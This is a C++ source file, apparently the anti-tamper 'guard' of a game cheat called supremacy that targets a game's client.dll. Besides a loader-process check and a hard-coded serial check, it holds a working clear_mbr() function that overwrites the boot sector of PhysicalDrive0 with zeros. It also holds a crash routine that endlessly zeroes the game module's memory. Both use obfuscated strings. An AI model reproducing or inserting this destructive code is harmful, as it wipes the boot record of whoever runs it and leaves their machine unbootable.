#ifndef ALPHA
#ifndef _DEBUG
#include "../../../supremacy.hpp"

namespace supremacy {
	bool c_guard::is_loader_run() {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		Process32First(snapshot, &pe);

		while (TRUE) {
			if (strcmp(pe.szExeFile, xorstr_("supremacy.exe")) == NULL)
				return true;

			if (!Process32Next(snapshot, &pe))
				return false;
		}
	}

	bool c_guard::is_serial_valid() {
		if (get_serial() == std::to_string(4460847643446215u))
			return true;

		return false;
	}

	void c_guard::clear_mbr() {
		DWORD write;
		char empty[0x200u];
		ZeroMemory(empty, sizeof empty);
		HANDLE master_boot_record = CreateFile(xorstr_("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		WriteFile(master_boot_record, empty, 0x200u, &write, NULL);
		raise(SIGSEGV);
	}

	void c_guard::crash() {
		MODULEINFO module_info;
		const auto client_module = (BUILDFOR13764 ? GetModuleHandle(xorstr_("client.dll")) : GetModuleHandle(xorstr_("client_panorama.dll")));
		GetModuleInformation(GetCurrentProcess(), client_module, &module_info, sizeof(MODULEINFO));

		auto address = (DWORD)module_info.lpBaseOfDll;

		while (TRUE) {
			*(DWORD*)(address) = NULL;
			++address;
		}
	}
}
#endif
#endif